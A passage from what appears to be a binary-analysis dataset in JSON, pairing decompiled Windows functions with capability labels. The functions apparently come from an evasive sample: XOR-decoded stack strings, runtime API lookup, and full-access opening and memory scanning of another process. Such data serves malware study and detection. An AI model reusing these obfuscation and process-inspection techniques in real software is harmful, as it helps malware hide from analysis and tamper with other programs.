0x5c;\n            var_183h = 0x2b;\n            var_182h = 0x40;\n            var_181h = 0x66;\n            var_124h._0_1_ = 0x6b;\n            var_124h._1_1_ = 0x49;\n            var_124h._2_1_ = 0x39;\n            var_124h._3_1_ = 0x45;\n            var_120h = 0x34;\n            var_11fh = 0x66;\n            fcn.004012a0(0xc);\n            for (var_34h = 0; var_34h < 0xc; var_34h = var_34h + 1) {\n                fcn.00401280(var_34h, *(&var_18ch + var_34h) ^ *(&var_124h + var_34h % 6));\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            var_1a8h[0] = 3;\n            var_1a8h[1] = 0x3e;\n            var_1a8h[2] = 0x7d;\n            var_1a8h[3] = 10;\n            var_1a4h = 2;\n            var_1a3h = 0x5e;\n            var_1a2h = 0;\n            var_1a1h = 0x3f;\n            var_1a0h = 0x46;\n            var_19fh = 0x1b;\n            var_19eh = 9;\n            var_19dh = 0x44;\n            var_19ch = 0x4d;\n            var_104h[0] = 0x4d;\n            var_104h[1] = 0x4a;\n            var_104h[2] = 0x32;\n            var_104h[3] = 0x7a;\n            var_100h = 0x67;\n            var_ffh[0] = 0x30;\n            fcn.004012a0(0xd);\n            for (var_38h = 0; var_38h < 0xd; var_38h = var_38h + 1) {\n                fcn.00401280(var_38h, var_1a8h[var_38h] ^ var_104h[var_38h % 6]);\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            var_1e8h[0] = 0x77;\n            var_1e8h[1] = 0xd;\n            var_1e8h[2] = 0x2e;\n            var_1e8h[3] = 5;\n            var_1e4h = 0x13;\n            var_1e3h = 0x5a;\n            var_1e2h = 0x6a;\n            var_1e1h = 0x1c;\n            var_1e0h = 0xc;\n            var_1dfh = 0x14;\n            var_1deh = 6;\n            var_1ddh = 0x5c;\n            var_1dch = 0x56;\n            var_1dbh = 0xb;\n            var_1dah = 4;\n            var_1d9h = 0x75;\n            var_f4h[0] = 0x39;\n            var_f4h[1] = 0x79;\n            var_f4h[2] = 0x61;\n            var_f4h[3] = 0x75;\n            var_f0h = 0x76;\n            var_efh = 0x34;\n            fcn.004012a0(0x10);\n            for (var_3ch = 0; var_3ch < 0x10; var_3ch = var_3ch + 1) {\n                fcn.00401280(var_3ch, var_1e8h[var_3ch] ^ var_f4h[var_3ch % 6]);\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            var_260h._0_1_ = 0x67;\n            var_260h._1_1_ = 0x3f;\n            var_260h._2_1_ = 0x14;\n            var_260h._3_1_ = 0x1d;\n            var_25ch = 0x31;\n            var_25bh = 0x56;\n            var_25ah = 0x24;\n            var_259h = 0x15;\n            var_258h = 0x29;\n            var_257h = 0x26;\n            var_256h = 0x50;\n            var_255h = 0x38;\n            var_254h = 0xb;\n            var_253h = 0x1b;\n            var_252h = 0x21;\n            var_251h = 0x53;\n            var_250h = 0x2d;\n            var_24fh = 0x1d;\n            var_24eh = 0x2b;\n            var_24dh = 0x54;\n            var_cch._0_1_ = 0x35;\n            var_cch._1_1_ = 0x4b;\n            var_cch._2_1_ = 0x78;\n            var_cch._3_1_ = 0x59;\n            var_c8h = 0x54;\n            fcn.004012a0(0x14);\n            for (var_40h = 0; var_40h < 0x14; var_40h = var_40h + 1) {\n                fcn.00401280(var_40h, *(&var_260h + var_40h) ^ *(&var_cch + var_40h % 5));\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            var_2e4h[0] = 8;\n            var_2e4h[1] = 0x3f;\n            var_2e4h[2] = 0x3e;\n            var_2e4h[3] = 0x17;\n            var_2e0h = 0x47;\n            var_2dfh = 0x3f;\n            var_2deh = 0x39;\n            var_2ddh = 0x2b;\n            var_2dch = 3;\n            var_2dbh = 0x5c;\n            var_2dah = 0x2c;\n            var_2d9h = 0x22;\n            var_2d8h = 0x20;\n            var_2d7h = 0x29;\n            var_2d6h = 0x5c;\n            var_2d5h = 0x37;\n            var_2d4h = 0x2e;\n            var_2d3h = 0x3c;\n            var_2d2h = 0x32;\n            var_2d1h = 100;\n            var_2d0h = 0x3b;\n            var_2cfh = 0x39;\n            var_2ceh = 0x3b;\n            var_2cdh = 0x27;\n            var_2cch = 0x50;\n            var_2cbh = 0x36;\n            var_2cah = 0x2e;\n            var_2c9h = 0x52;\n            var_c4h._0_1_ = 0x5a;\n            var_c4h._1_1_ = 0x4b;\n            var_c4h._2_1_ = 0x52;\n            var_c4h._3_1_ = 0x46;\n            var_c0h = 0x32;\n            fcn.004012a0(0x1c);\n            for (var_44h = 0; var_44h < 0x1c; var_44h = var_44h + 1) {\n                fcn.00401280(var_44h, var_2e4h[var_44h] ^ *(&var_c4h + var_44h % 5));\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            var_2c8h[0] = 0x27;\n            var_2c8h[1] = 0x47;\n            var_2c8h[2] = 0x37;\n            var_2c8h[3] = 0x1c;\n            var_2c4h = 2;\n            var_2c3h = 0x1b;\n            var_2c2h = 0x4a;\n            var_2c1h = 0x2f;\n            var_2c0h = 7;\n            var_2bfh = 1;\n            var_2beh = 6;\n            var_2bdh = 0x41;\n            var_2bch = 0xb;\n            var_2bbh = 8;\n            var_2bah = 0x13;\n            var_2b9h = 0;\n            var_2b8h = 0x5c;\n            var_2b7h = 8;\n            var_2b6h = 0x39;\n            var_2b5h = 0x15;\n            var_2b4h = 6;\n            var_2b3h = 0x50;\n            var_2b2h = 3;\n            var_2b1h = 0x1a;\n            var_2b0h = 0x14;\n            var_2afh = 0x69;\n            var_bch._0_1_ = 0x69;\n            var_bch._1_1_ = 0x33;\n            var_bch._2_1_ = 0x66;\n            var_bch._3_1_ = 0x69;\n            var_b8h = 0x67;\n            fcn.004012a0(0x1a);\n            for (var_48h = 0; var_48h < 0x1a; var_48h = var_48h + 1) {\n                fcn.00401280(var_48h, var_2c8h[var_48h] ^ *(&var_bch + var_48h % 5));\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            var_290h._0_1_ = 7;\n            var_290h._1_1_ = 0x43;\n            var_290h._2_1_ = 0x14;\n            var_290h._3_1_ = 0x71;\n            var_28ch = 0x54;\n            var_28bh = 0x57;\n            var_28ah = 0x14;\n            var_289h = 0x43;\n            var_288h = 0x17;\n            var_287h = 0x5d;\n            var_286h = 100;\n            var_285h = 0x5c;\n            var_284h = 0x14;\n            var_283h = 0x43;\n            var_282h = 0x17;\n            var_281h = 0x5d;\n            var_280h = 100;\n            var_27fh = 0x52;\n            var_27eh = 0x37;\n            var_27dh = 0x5b;\n            var_27ch = 0x1d;\n            var_27bh = 0x30;\n            var_ech[0] = 0x55;\n            var_ech[1] = 0x37;\n            var_ech[2] = 0x78;\n            var_ech[3] = 0x30;\n            var_e8h = 0x30;\n            var_e7h = 0x33;\n            fcn.004012a0(0x16);\n            for (var_4ch = 0; var_4ch < 0x16; var_4ch = var_4ch + 1) {\n                fcn.00401280(var_4ch, *(&var_290h + var_4ch) ^ var_ech[var_4ch % 6]);\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            var_2ach[0] = 0x35;\n            var_2ach[1] = 0x40;\n            var_2ach[2] = 0x2d;\n            var_2ach[3] = 0xd;\n            var_2a8h = 0x24;\n            var_2a7h = 0x56;\n            var_2a6h = 0xc;\n            var_2a5h = 0x41;\n            var_2a4h = 0x31;\n            var_2a3h = 0;\n            var_2a2h = 0x3f;\n            var_2a1h = 0x56;\n            var_2a0h = 10;\n            var_29fh = 0x7d;\n            var_29eh = 0x2f;\n            var_29dh = 0;\n            var_29ch = 0x3f;\n            var_29bh = 0x56;\n            var_29ah = 10;\n            var_299h = 0x60;\n            var_298h = 0x20;\n            var_297h = 0x23;\n            var_296h = 0x27;\n            var_295h = 0x5c;\n            var_294h = 0x67;\n            var_12ch._0_1_ = 0x67;\n            var_12ch._1_1_ = 0x34;\n            var_12ch._2_1_ = 0x41;\n            var_12ch._3_1_ = 0x41;\n            var_128h = 0x4b;\n            var_127h = 0x39;\n            fcn.004012a0(0x19);\n            for (var_50h = 0; var_50h < 0x19; var_50h = var_50h + 1) {\n                fcn.00401280(var_50h, var_2ach[var_50h] ^ *(&var_12ch + var_50h % 6));\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            var_15ch._0_1_ = 0x2a;\n            var_15ch._1_1_ = 0x1b;\n            var_15ch._2_1_ = 0x25;\n            var_15ch._3_1_ = 0x1c;\n            var_158h = 0x52;\n            var_157h = 0x25;\n            var_156h = 0x1b;\n            var_155h = 0xb;\n            var_154h = 0x15;\n            var_153h = 0x36;\n            var_b4h._0_1_ = 100;\n            var_b4h._1_1_ = 0x6f;\n            var_b4h._2_1_ = 100;\n            var_b4h._3_1_ = 0x78;\n            var_b0h = 0x36;\n            fcn.004012a0(10);\n            for (var_54h = 0; var_54h < 10; var_54h = var_54h + 1) {\n                fcn.00401280(var_54h, *(&var_15ch + var_54h) ^ *(&var_b4h + var_54h % 5));\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            var_168h._0_1_ = 0x3f;\n            var_168h._1_1_ = 0xe;\n            var_168h._2_1_ = 0x31;\n            var_168h._3_1_ = 0x50;\n            var_164h = 5;\n            var_163h = 0x15;\n            var_162h = 0x3b;\n            var_161h = 3;\n            var_160h = 0x56;\n            var_15fh = 6;\n            var_15eh = 0x71;\n            var_ach._0_1_ = 0x71;\n            var_ach._1_1_ = 0x7a;\n            var_ach._2_1_ = 0x77;\n            var_ach._3_1_ = 0x39;\n            var_a8h = 0x6b;\n            fcn.004012a0(0xb);\n            for (var_58h = 0; var_58h < 0xb; var_58h = var_58h + 1) {\n                fcn.00401280(var_58h, *(&var_168h + var_58h) ^ *(&var_ach + var_58h % 5));\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            var_198h._0_1_ = 6;\n            var_198h._1_1_ = 3;\n            var_198h._2_1_ = 0x2b;\n            var_198h._3_1_ = 0x2a;\n            var_194h = 0x5d;\n            var_193h = 0x2f;\n            var_192h = 0x3c;\n            var_191h = 0x18;\n            var_190h = 7;\n            var_18fh = 0xb;\n            var_18eh = 0x41;\n            var_18dh = 0x6e;\n            var_134h._0_1_ = 0x48;\n            var_134h._1_1_ = 0x77;\n            var_134h._2_1_ = 0x6a;\n            var_134h._3_1_ = 0x4e;\n            var_130h = 0x39;\n            var_12fh = 0x6e;\n            fcn.004012a0(0xc);\n            for (var_5ch = 0; var_5ch < 0xc; var_5ch = var_5ch + 1) {\n                fcn.00401280(var_5ch, *(&var_198h + var_5ch) ^ *(&var_134h + var_5ch % 6));\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            var_174h[0] = 0x1d;\n            var_174h[1] = 0x3e;\n            var_174h[2] = 0x3c;\n            var_174h[3] = 0x34;\n            var_170h = 0x3e;\n            var_16fh = 0x17;\n            var_16eh = 0x35;\n            var_16dh = 0x1e;\n            var_16ch = 0x22;\n            var_16bh = 0x14;\n            var_16ah = 0x51;\n            var_13ch[0] = 0x51;\n            var_13ch[1] = 0x5a;\n            var_13ch[2] = 0x4e;\n            var_13ch[3] = 0x78;\n            var_138h = 0x51;\n            var_137h = 0x76;\n            fcn.004012a0(0xb);\n            for (var_60h = 0; var_60h < 0xb; var_60h = var_60h + 1) {\n                fcn.00401280(var_60h, var_174h[var_60h] ^ var_13ch[var_60h % 6]);\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(lpAddress, dwSize, 0x4000);\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    var_328h[0] = 0x6b;\n    var_328h[1] = 0x6e;\n    var_328h[2] = 0x34;\n    var_328h[3] = 0x36;\n    var_324h = 0x2d;\n    var_323h = 99;\n    var_322h = 0x3d;\n    var_321h = 0x6e;\n    var_320h = 0x13;\n    var_31fh = 0x36;\n    var_31eh = 0x31;\n    var_31dh = 99;\n    var_31ch = 0x23;\n    var_31bh = 0x6e;\n    var_31ah = 0x35;\n    var_319h = 0x36;\n    var_318h = 0x3b;\n    var_317h = 99;\n    var_316h = 0x21;\n    var_315h = 0x6e;\n    var_314h = 0x13;\n    var_313h = 0x36;\n    var_312h = 0x71;\n    var_311h = 99;\n    var_310h = 0x12;\n    var_30fh = 0x6e;\n    var_30eh = 0x34;\n    var_30dh = 0x36;\n    var_30ch = 0x2d;\n    var_30bh = 99;\n    var_30ah = 0x3d;\n    var_309h = 0x6e;\n    var_308h = 0x13;\n    var_307h = 0x36;\n    var_306h = 0x31;\n    var_305h = 99;\n    var_304h = 0x23;\n    var_303h = 0x6e;\n    var_302h = 0x54;\n    var_301h = 0x36;\n    var_300h = 0x66;\n    var_2ffh = 99;\n    var_2feh = 0x12;\n    var_2fdh = 0x6e;\n    var_2fch = 0x12;\n    var_2fbh = 0x36;\n    var_2fah = 0x27;\n    var_2f9h = 99;\n    var_2f8h = 0x2b;\n    var_2f7h = 0x6e;\n    var_2f6h = 0x15;\n    var_2f5h = 0x36;\n    var_2f4h = 0x67;\n    var_2f3h = 99;\n    var_2f2h = 0x7c;\n    var_2f1h = 0x6e;\n    var_2f0h = 0x49;\n    var_2efh = 0x36;\n    var_2eeh = 0x30;\n    var_2edh = 99;\n    var_2ech = 0x22;\n    var_2ebh = 0x6e;\n    var_2eah = 0xb;\n    var_2e9h = 0x36;\n    var_2e8h = 0x54;\n    var_2e7h = 99;\n    var_144h._0_1_ = 0x4e;\n    var_144h._1_1_ = 0x6e;\n    var_144h._2_1_ = 0x67;\n    var_144h._3_1_ = 0x36;\n    var_140h = 0x54;\n    var_13fh = 99;\n    fcn.004012a0(0x84);\n    for (var_64h = 0; var_64h < 0x42; var_64h = var_64h + 1) {\n        fcn.00401280(var_64h, var_328h[var_64h] ^ *(&var_144h + var_64h % 6));\n    }\n    puVar5 = &var_74h;\n    puVar4 = &var_ch;\n    uVar1 = fcn.00401270();\n    iVar2 = fcn.004162b0(uVar1, puVar4, puVar5);\n    if (((iVar2 == 0) && (var_ch != 0)) && (var_74h != 0)) {\n        iVar2 = fcn.004171d0(var_ch, 0, 1, &lpAddress, &dwSize);\n        if (iVar2 != 0) {\n            var_180h._0_1_ = 0x16;\n            var_180h._1_1_ = 0x16;\n            var_180h._2_1_ = 0x2c;\n            var_180h._3_1_ = 0x11;\n            var_17ch = 0x6b;\n            var_17bh = 0x51;\n            var_17ah = 0x4b;\n            var_179h = 0x2d;\n            var_178h = 0xf;\n            var_177h = 0x34;\n            var_176h = 99;\n            var_94h._0_1_ = 99;\n            var_94h._1_1_ = 0x65;\n            var_94h._2_1_ = 0x49;\n            var_94h._3_1_ = 99;\n            var_90h = 0x58;\n            fcn.004012a0(0xb);\n            for (var_68h = 0; var_68h < 0xb; var_68h = var_68h + 1) {\n                fcn.00401280(var_68h, *(&var_180h + var_68h) ^ *(&var_94h + var_68h % 5));\n            }\n            var_210h._0_1_ = 100;\n            var_210h._1_1_ = 0x54;\n            var_210h._2_1_ = 0x31;\n            var_210h._3_1_ = 0x10;\n            var_20ch = 0xc;\n            var_20bh = 0x59;\n            var_20ah = 0x55;\n            var_209h = 0x2a;\n            var_208h = 0x30;\n            var_207h = 0x16;\n            var_206h = 0x7f;\n            var_205h = 0x5e;\n            var_204h = 0x2a;\n            var_203h = 0x2c;\n            var_202h = 0x20;\n            var_201h = 0x4f;\n            var_200h = 0x70;\n            var_1ffh = 0x45;\n            var_9ch._0_1_ = 0x37;\n            var_9ch._1_1_ = 0x31;\n            var_9ch._2_1_ = 0x45;\n            var_9ch._3_1_ = 0x47;\n            var_98h = 0x65;\n            fcn.004012a0(0x12);\n            for (var_6ch = 0; var_6ch < 0x12; var_6ch = var_6ch + 1) {\n                fcn.00401280(var_6ch, *(&var_210h + var_6ch) ^ *(&var_9ch + var_6ch % 5));\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            var_224h._0_1_ = 0x1a;\n            var_224h._1_1_ = 0x23;\n            var_224h._2_1_ = 0x40;\n            var_224h._3_1_ = 0x13;\n            var_220h = 7;\n            var_21fh = 0x27;\n            var_21eh = 0x22;\n            var_21dh = 0x5b;\n            var_21ch = 0x33;\n            var_21bh = 0x1d;\n            var_21ah = 1;\n            var_219h = 0x29;\n            var_218h = 0x5b;\n            var_217h = 0x2f;\n            var_216h = 0x2b;\n            var_215h = 0x31;\n            var_214h = 0x11;\n            var_213h = 0x34;\n            var_a4h._0_1_ = 0x49;\n            var_a4h._1_1_ = 0x46;\n            var_a4h._2_1_ = 0x34;\n            var_a4h._3_1_ = 0x44;\n            var_a0h = 0x6e;\n            fcn.004012a0(0x12);\n            for (var_70h = 0; var_70h < 0x12; var_70h = var_70h + 1) {\n                fcn.00401280(var_70h, *(&var_224h + var_70h) ^ *(&var_a4h + var_70h % 5));\n            }\n            uVar1 = fcn.00401270();\n            uVar3 = fcn.00401270();\n            fcn.00417be0(lpAddress, uVar3, uVar1);\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(lpAddress, dwSize, 0x4000);\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    fcn.004012d0();\n    fcn.004012d0();\n    return;\n}\n",
        "token_count": 16368
    },
    "00419c50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00419c50(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint lpSystemInfo;\n    uint32_t var_c0h;\n    uint32_t var_bch;\n    uint var_a4h;\n    int32_t var_98h;\n    int32_t var_8ch;\n    uint32_t var_88h;\n    code *var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uchar var_6ch;\n    uchar var_6bh;\n    uchar var_6ah;\n    uchar var_69h;\n    uchar var_68h;\n    uchar var_67h;\n    uchar var_66h;\n    uchar var_65h;\n    uchar var_64h;\n    uchar var_63h;\n    uchar var_62h;\n    uchar var_61h;\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uchar var_5dh;\n    uchar var_5ch;\n    uchar var_5bh;\n    uchar var_5ah;\n    uchar var_59h;\n    uchar var_58h;\n    uchar var_57h;\n    uint var_54h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uint var_3ch;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uchar var_33h;\n    uint var_30h;\n    uchar var_2ch;\n    uchar var_2bh;\n    uint8_t var_28h [4];\n    uchar var_24h;\n    uint var_20h;\n    uchar var_1ch;\n    uint hObject;\n    uchar *lpAddress;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_80h = 0x200;\n    lpAddress = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x200, 0x3000, 4);\n    hObject = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1f0fff, 0, arg_8h);\n    var_54h._0_1_ = 0x7a;\n    var_54h._1_1_ = 0x44;\n    var_54h._2_1_ = 0x69;\n    var_54h._3_1_ = 0x21;\n    var_50h = 0xf;\n    var_4fh = 0x37;\n    var_4eh = 0x4d;\n    var_4dh = 0x66;\n    var_4ch = 0x51;\n    var_4bh = 0x26;\n    var_4ah = 0x1e;\n    var_49h = 0x30;\n    var_48h = 0x55;\n    var_47h = 0x5c;\n    var_46h = 0x75;\n    var_45h = 0x31;\n    var_44h = 7;\n    var_43h = 0x2a;\n    var_42h = 0x46;\n    var_41h = 0x49;\n    var_40h = 0x38;\n    var_30h._0_1_ = 0x34;\n    var_30h._1_1_ = 0x30;\n    var_30h._2_1_ = 0x38;\n    var_30h._3_1_ = 0x54;\n    var_2ch = 0x6a;\n    var_2bh = 0x45;\n    fcn.004012a0(0x15);\n    for (var_4h = 0; var_4h < 0x15; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_54h + var_4h) ^ *(&var_30h + var_4h % 6));\n    }\n    var_3ch._0_1_ = 0x27;\n    var_3ch._1_1_ = 0x1f;\n    var_3ch._2_1_ = 5;\n    var_3ch._3_1_ = 1;\n    var_38h = 0x3d;\n    var_37h = 0x67;\n    var_36h = 0xf;\n    var_35h = 0xd;\n    var_34h = 1;\n    var_33h = 0x51;\n    var_20h._0_1_ = 0x49;\n    var_20h._1_1_ = 0x6b;\n    var_20h._2_1_ = 0x61;\n    var_20h._3_1_ = 0x6d;\n    var_1ch = 0x51;\n    fcn.004012a0(10);\n    for (var_8h = 0; var_8h < 10; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_3ch + var_8h) ^ *(&var_20h + var_8h % 5));\n    }\n    uVar1 = fcn.00401270();\n    uVar1 = fcn.00401270(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar1);\n    var_84h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    (*_sym.imp.KERNEL32.dll_GetSystemInfo)(&lpSystemInfo);\n    var_10h = var_c0h;\n    var_88h = var_bch;\n    var_70h._0_1_ = 0x19;\n    var_70h._1_1_ = 0x6d;\n    var_70h._2_1_ = 7;\n    var_70h._3_1_ = 0x56;\n    var_6ch = 0x1b;\n    var_6bh = 0x45;\n    var_6ah = 0xc;\n    var_69h = 0x46;\n    var_68h = 0x25;\n    var_67h = 0x6d;\n    var_66h = 0x31;\n    var_65h = 0x6d;\n    var_64h = 0x1a;\n    var_63h = 0x56;\n    var_62h = 9;\n    var_61h = 0x45;\n    var_60h = 8;\n    var_5fh = 0x46;\n    var_5eh = 0x30;\n    var_5dh = 0x6d;\n    var_5ch = 0x36;\n    var_5bh = 0x6d;\n    var_5ah = 0x1a;\n    var_59h = 0x56;\n    var_58h = 0x6d;\n    var_57h = 0x45;\n    var_28h[0] = 0x45;\n    var_28h[1] = 0x6d;\n    var_28h[2] = 0x46;\n    var_28h[3] = 0x56;\n    var_24h = 0x6d;\n    fcn.004012a0(0x34);\n    for (var_ch = 0; var_ch < 0x1a; var_ch = var_ch + 1) {\n        fcn.00401280(var_ch, *(&var_70h + var_ch) ^ var_28h[var_ch % 5]);\n    }\n    for (; var_10h < var_88h; var_10h = var_10h + var_98h) {\n        iVar2 = (*var_84h)(hObject, var_10h, 0, &var_a4h, 0x1c, 0);\n        if ((-1 < iVar2) && (var_8ch == 0x1000000)) {\n            puVar3 = lpAddress;\n            for (iVar2 = 0x200; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            iVar2 = (*var_84h)(hObject, var_10h, 2, lpAddress, var_80h, 0);\n            if (-1 < iVar2) {\n                uVar1 = fcn.00401270();\n                iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(*(lpAddress + 4), uVar1);\n                if (iVar2 != 0) {\n                    (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hObject, 0xffffffff);\n                    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n                }\n            }\n        }\n    }\n    if (lpAddress != NULL) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(lpAddress, 0, 0x8000);\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    return;\n}\n",
        "token_count": 2289
    },
    "0041a400": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0041a400(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    code *var_190h;\n    uint var_18ch;\n    uint uStack396;\n    int32_t var_184h;\n    uint32_t var_180h;\n    uint32_t var_17ch;\n    uint32_t var_178h;\n    code *var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uchar *var_168h;\n    uchar *var_164h;\n    uint var_160h;\n    uchar var_15ch;\n    uchar var_15bh;\n    uchar var_15ah;\n    uchar var_159h;\n    uchar var_158h;\n    uchar var_157h;\n    uchar var_156h;\n    uchar var_155h;\n    uchar var_154h;\n    uchar var_153h;\n    uchar var_152h;\n    uchar var_151h;\n    uchar var_150h;\n    uchar var_14fh;\n    uchar var_14eh;\n    uchar var_14dh;\n    uchar var_14ch;\n    uchar var_14bh;\n    uchar var_14ah;\n    uchar var_149h;\n    uchar var_148h;\n    uchar var_147h;\n    uchar var_146h;\n    uchar var_145h;\n    uchar var_144h;\n    uchar var_143h;\n    uchar var_142h;\n    uchar var_141h;\n    uchar var_140h;\n    uchar var_13fh;\n    uchar var_13eh;\n    uchar var_13dh;\n    uchar var_13ch;\n    uchar var_13bh;\n    uchar var_13ah;\n    uchar var_139h;\n    uchar var_138h;\n    uchar var_137h;\n    uchar var_136h;\n    uchar var_135h;\n    uchar var_134h;\n    uchar var_133h;\n    uchar var_132h;\n    uchar var_131h;\n    uchar var_130h;\n    uchar var_12fh;\n    uchar var_12eh;\n    uchar var_12dh;\n    uchar var_12ch;\n    uchar var_12bh;\n    uchar var_12ah;\n    uchar var_129h;\n    uchar var_128h;\n    uchar var_127h;\n    uchar var_126h;\n    uchar var_125h;\n    uchar var_124h;\n    uchar var_123h;\n    uchar var_122h;\n    uchar var_121h;\n    uchar var_120h;\n    uchar var_11fh;\n    uchar var_11eh;\n    uchar var_11dh;\n    uchar var_11ch;\n    uchar var_11bh;\n    uchar var_11ah;\n    uchar var_119h;\n    uchar var_118h;\n    uchar var_117h;\n    uchar var_116h;\n    uchar var_115h;\n    uchar var_114h;\n    uchar var_113h;\n    uint8_t var_110h [4];\n    uchar var_10ch;\n    uchar var_10bh;\n    uchar var_10ah;\n    uchar var_109h;\n    uchar var_108h;\n    uchar var_107h;\n    uchar var_106h;\n    uchar var_105h;\n    uchar var_104h;\n    uchar var_103h;\n    uchar var_102h;\n    uchar var_101h;\n    uchar var_100h;\n    uchar var_ffh;\n    uchar var_feh;\n    uchar var_fdh;\n    uchar var_fch;\n    uchar var_fbh;\n    uchar var_fah;\n    uchar var_f9h;\n    uchar var_f8h;\n    uchar var_f7h;\n    uchar var_f6h;\n    uchar var_f5h;\n    uchar var_f4h;\n    uchar var_f3h;\n    uchar var_f2h;\n    uchar var_f1h;\n    uchar var_f0h;\n    uchar var_efh;\n    uchar var_eeh;\n    uchar var_edh;\n    uchar var_ech;\n    uchar var_ebh;\n    uchar var_eah;\n    uchar var_e9h;\n    uint var_e8h;\n    uchar var_e4h;\n    uchar var_e3h;\n    uchar var_e2h;\n    uchar var_e1h;\n    uchar var_e0h;\n    uchar var_dfh;\n    uchar var_deh;\n    uchar var_ddh;\n    uchar var_dch;\n    uchar var_dbh;\n    uchar var_dah;\n    uchar var_d9h;\n    uchar var_d8h;\n    uchar var_d7h;\n    uchar var_d6h;\n    uchar var_d5h;\n    uint var_d4h;\n    uchar var_d0h;\n    uchar var_cfh;\n    uchar var_ceh;\n    uchar var_cdh;\n    uchar var_cch;\n    uchar var_cbh;\n    uchar var_cah;\n    uchar var_c9h;\n    uchar var_c8h;\n    uchar var_c7h;\n    uchar var_c6h;\n    uchar var_c5h;\n    uchar var_c4h;\n    uchar var_c3h;\n    uchar var_c2h;\n    uchar var_c1h;\n    uint8_t var_c0h [4];\n    uchar var_bch;\n    uchar var_bbh;\n    uchar 